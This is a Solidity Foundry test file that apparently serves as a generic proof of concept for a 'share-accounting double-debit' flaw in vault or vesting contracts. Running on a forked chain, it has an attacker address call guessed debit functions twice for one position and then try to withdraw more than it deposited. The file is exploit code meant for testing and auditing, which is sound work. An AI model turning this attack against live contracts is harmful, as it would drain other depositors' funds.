// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Share accounting double-debit
/// @notice Detector: share-accounting-double-debit. Two entry points remove the
///         same position's shares from a global total and neither clears the
///         position, so the denominator shrinks twice and a small position can
///         withdraw other depositors' tokens.
/// @dev FORK-ONLY. POC_TARGET is the vesting/vault contract; POC_POSITION_ID is
///      a position the attacker owns (create one first if the contract lets
///      you). Success is the attacker's ETH balance ABOVE what they put in.
contract PoC is Test {
    address public target;
    uint256 public positionId;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set (the vault)");
        positionId = vm.envOr("POC_POSITION_ID", uint256(0));
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_doubleDebit() public {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        uint256 start = attacker.balance;
        bool debited = false;
        string[4] memory paths = ["release(uint256)", "cancel(uint256)", "claim(uint256)", "refund(uint256)"];

        // Two different debit paths for the SAME position.
        for (uint256 round = 0; round < 2 && !debited; ++round) {
            for (uint256 i = 0; i < paths.length; ++i) {
                vm.prank(attacker);
                (bool ok,) = target.call(abi.encodeWithSignature(paths[i], positionId));
                console.log("tried", paths[i], ok ? "returned" : "reverted");
                if (ok) debited = true;
            }
        }

        // Then withdraw whatever the accounting now says is owed.
        string[3] memory outs = ["withdraw(uint256)", "withdrawAll()", "collect(uint256)"];
        for (uint256 i = 0; i < outs.length; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call(
                i == 0 || i == 2
                    ? abi.encodeWithSignature(outs[i], positionId)
                    : abi.encodeWithSignature(outs[i])
            );
            console.log("tried", outs[i], ok ? "returned" : "reverted");
        }

        assertTrue(
            attacker.balance > start,
            "the attacker did not end up ahead. Tried release(uint256), cancel(uint256), claim(uint256), refund(uint256) twice over for the same position, then withdraw(uint256), withdrawAll(), collect(uint256). This does NOT establish safety: the paths may be named differently, the position may not belong to the attacker, or the contract may clear the shares (which is the fix) — read the debit sites before concluding."
        );
    }
}
